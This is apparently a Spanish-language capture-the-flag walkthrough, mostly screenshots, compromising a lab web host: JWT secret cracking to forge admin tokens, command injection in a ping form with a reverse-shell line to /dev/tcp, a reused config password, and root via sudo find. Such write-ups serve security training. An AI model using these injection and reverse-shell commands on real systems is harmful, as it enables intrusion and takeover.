
Hacemos un nmap para escanear al host:

![[Pasted image 20260624174525.png]]

Vemos que hay un servidor web HTTP en el puerto 80 y en el puerto 22 SSH.

Hacemos un *whatweb* y un *gobuster* para ver que tiene esta web antes de entrar:
![[Pasted image 20260624174625.png]]

![[Pasted image 20260624174701.png]]

Vemos varios archivos asi que entramos en index.php ya que dashboard y admin redirigen a index:

![[Pasted image 20260624174752.png]]

Hay un pequeño login que si probamos credenciales por defecto como *admin:admin* o *root:root* no dejará.

Si vemos el codigo fuente nos encontramos con:

![[Pasted image 20260624174834.png]]

Que hay unas credenciales *guest:guest*, asi que probamos:


![[Pasted image 20260624174904.png]]

Y vemos que hay un panel de control pero al de admin no tenemos acceso. Tambien podemos ver que se ha generado un token jwt, asi que lo analizaremos:

![[Pasted image 20260624175005.png]]

Vemos que usa HS256 para firmar, por lo tanto es criptografia simetrica (misma llave tanto para firmar como para verificar). Asi que intentamos buscar alguna herramienta que nos haga el crackeo:

https://github.com/lmammino/jwt-cracker


![[Pasted image 20260624175110.png]]

Y en este caso nos encuentra que el secreto es batman, asique podemos crear *admin tokens* para la web:

![[Pasted image 20260624175241.png]]

![[Pasted image 20260624175424.png]]

Entonces tenemos accedo al *NOC*:

![[Pasted image 20260624175448.png]]

Que hace un simple ping, probamos si el input esta verificado o podemos escapar:

![[Pasted image 20260624175510.png]]

Y tenemos ejecución remota de comandos, asi que nos enviamos una reverse shell con el comando:

```bash
127.0.0.1; bash -c 'bash -i >& /dev/tcp/IP/PUERTO 0>&1'
```
![[Pasted image 20260624175607.png]]

Y tenemos acceso como el usuario www-data. Empezamos a investigar todos los archivos y vemos que hay un archivo de configuracion con credenciales:

![[Pasted image 20260624175652.png]]

Si probamos a hacer:

```bash
su bruce
# contraseña Arkh4m_Kn1ght!'
```
Ya que hemos visto en */etc/passwd* que hay un usuario del sistema llamado **bruce**
![[Pasted image 20260624175751.png]]

Y tenemos acceso como bruce. Ahora intentamos escalar privilegios:

Vemos que el binario *find* lo pueden ejecutar todos como root:
![[Pasted image 20260624175834.png]]

Asi que con el one liner, escalamos privilegios

```bash
sudo /usr/bin/find . -exec /bin/bash -p \; -quit
```

![[Pasted image 20260624175904.png]]

